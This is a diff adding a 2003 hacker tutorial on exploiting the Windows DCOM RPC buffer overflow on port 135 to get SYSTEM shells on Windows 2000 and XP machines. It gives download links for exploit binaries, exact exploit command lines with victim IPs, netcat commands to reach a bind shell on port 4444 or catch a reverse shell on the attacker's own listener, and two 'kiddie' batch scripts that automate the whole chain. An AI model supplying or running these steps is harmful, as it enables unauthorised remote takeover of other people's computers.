@@ -1,0 +1,82 @@
+DCOM RPC exploit paper
+7/26/03
+by: illwill <xillwillx@yahoo.com>
+-------------------------------------------------------------------------------
+ Paper on how to remotely exploit for win32 NT boxes using a buffer overflow
+ on port 135 through the Windows RPC Interface resulting in execution of any 
+ commands on vulnerable Windows systems with SYSTEM privileges.
+       http://illmob.org/rpc/
+_______________________________________________________________________________
+
+There are 2 dcom Win32 ported versions available:
+Ben Lauziere blauziere@alern.org   http://illmob.org/rpc/DComExpl_UnixWin32.zip
+"exceed" exceed@microsoftsucks.org http://illmob.org/rpc/dcom-win32.zip
+
+for my example ill be using ben's version cuz it doesnt use a cygwin.dll
+how to use the Dcom32.exe ported for win32 boxes:
+
+c:\> dcom32.exe <OS ver. & service pack> <Victim IP>
+(ex. C:\> dcom32.exe 2 192.168.0.2)
+if all goes well you should get a shell on port 4444 to connect to.
+fire up netcat
+
+c:> nc -vvv VicIP Port
+(ex.  c:\>nc 192.168.0.2 4444
+JackedXP [192.168.0.2] 4444 open
+Microsoft Windows XP [Version 5.1.2600]
+C:\WINDOWS\system32>)
+
+BAM!!! You got a command prompt access to the victim box!!
+
+easy kiddie bat for dcom32 from morning_wood
+
+<snip rpcx.bat>
+@echo on
+@echo easy kiddi .bat by morning_wood@exploitlabs.com
+@echo useage is "target remote-ip"
+@echo target is 1-6 where
+@echo -          0	Windows 2000 SP0 (english)
+@echo -          1	Windows 2000 SP1 (english)
+@echo -          2	Windows 2000 SP2 (english)
+@echo -          3	Windows 2000 SP3 (english)
+@echo -          4	Windows 2000 SP4 (english)
+@echo -          5	Windows XP SP0 (english)
+@echo -          6	Windows XP SP1 (english)
+pause
+dcom32 %1 %2
+nc -vvv %2 4444
+</snip>
+
+commandline for it would be 
+rpcx.bat <osVer> <IP>
+(ex. rpcx 2 192.168.0.2)
+
+
+
+
+
+
+
+how to use the root32 exploit (which i found to work like shit.)
+first open a recieving netcat connection on your own computer
+using the command line
+nc -l -v -p 1199  (1199 can be any port you desire)
+
+
+then use the command line for root32.exe
+
+root32.exe 172.0.15.29   64.252.136.135       1199     2
+            remoteIP^       yourIP^     yourPORT^    ^vic service pack
+
+if all goes well you should recieve a commandline connect-back 
+prompt through netcat to the vulnerable box.
+
+morning_wood's quick n grimy bat file Root.bat
+<snip>
+root32 %1 %2 %3 2
+nc -vv %1 %3
+</snip>
+
+peace out. 
+illwill
+http://illmob.org
